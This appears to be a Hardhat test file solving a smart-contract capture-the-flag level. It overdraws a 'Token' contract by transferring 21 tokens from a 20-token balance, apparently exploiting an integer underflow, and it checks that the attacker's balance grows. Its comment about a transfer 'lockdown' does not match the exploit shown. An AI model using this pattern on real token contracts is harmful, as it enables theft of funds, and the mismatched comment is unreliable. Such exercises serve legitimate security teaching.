const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Token', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('Token', attacker);
        this.token = await Factory.deploy(20);
    });
    // The lockdown only applies to transfer and not to the transferFrom function of the ERC20 standard
    it('Exploit', async function () {
        let victimInstance = await this.token.connect(attacker);
        await victimInstance.transfer(victimInstance.address, 21);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(20);
    });
});